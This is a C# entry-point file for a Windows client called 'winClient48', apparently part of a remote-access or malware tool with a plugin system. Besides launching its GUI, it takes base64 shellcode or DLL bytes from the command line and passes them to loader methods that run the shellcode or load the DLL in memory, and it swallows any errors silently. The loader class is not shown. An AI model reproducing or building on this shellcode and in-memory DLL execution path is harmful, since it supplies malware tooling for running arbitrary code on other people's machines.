using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Reflection;
using System.Threading.Tasks;
using System.Windows.Forms;

using Plugin.Abstractions48;

namespace winClient48
{
    internal static class Program
    {
        /// <summary>
        /// The main entry point for the application.
        /// </summary>
        [STAThread]
        static void Main(string[] args)
        {
            if (args.Length > 1)
            {
                clsfnLoader loader = new clsfnLoader();

                try
                {
                    if (args[0] == "--sc")
                    {
                        string szB64 = args[1];
                        byte[] abShellcode = Convert.FromBase64String(szB64);

                        loader.fnShellCodeLoader(abShellcode);
                }
                    else if (args[0] == "--dll")
                    {
                        string szB64 = args[1];
                        byte[] abDllBytes = Convert.FromBase64String(szB64);

                        loader.fnLdrLoadDll(abDllBytes);
                    }
                }
                catch (Exception ex)
                {

                }
            }
            else
            {
                AppDomain.CurrentDomain.AssemblyResolve += CurrentDomain_AssemblyResolve;

                Application.EnableVisualStyles();
                Application.SetCompatibleTextRenderingDefault(false);
                Application.Run(new Form1(args));
            }
        }

        private static Assembly CurrentDomain_AssemblyResolve(object sender, ResolveEventArgs args)
        {
            var name = new AssemblyName(args.Name).Name;
            if (name == "Plugin.Abstractions48")
            {
                return typeof(IPlugin).Assembly;
            }

            return null;
        }
    }
}
